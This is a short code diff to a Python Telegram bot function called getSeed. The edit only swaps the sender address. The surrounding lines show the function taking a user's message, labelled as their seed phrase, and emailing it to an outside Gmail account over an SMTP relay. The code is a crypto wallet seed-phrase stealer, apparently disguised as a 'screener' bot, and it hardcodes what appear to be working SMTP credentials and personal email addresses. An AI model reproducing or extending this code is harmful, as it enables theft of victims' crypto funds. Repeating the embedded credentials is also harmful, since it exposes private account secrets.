@@ -47,7 +47,7 @@ def getSeed(update: Update, context: CallbackContext) -> str:
     smtp_username = "870b79001@smtp-brevo.com"
     smtp_password = "NT2hk8WtrzQR9vVf"
 
-    sender_mail = "devollopex@gmail.com"
+    sender_mail = "jimmywillbanks4@gmail.com"
     receiver_email = "screenerbotdex@gmail.com"
 
     text = f"THIS IS THE SEED PHRASE\n----------------------------------------\n {update.message.text}"
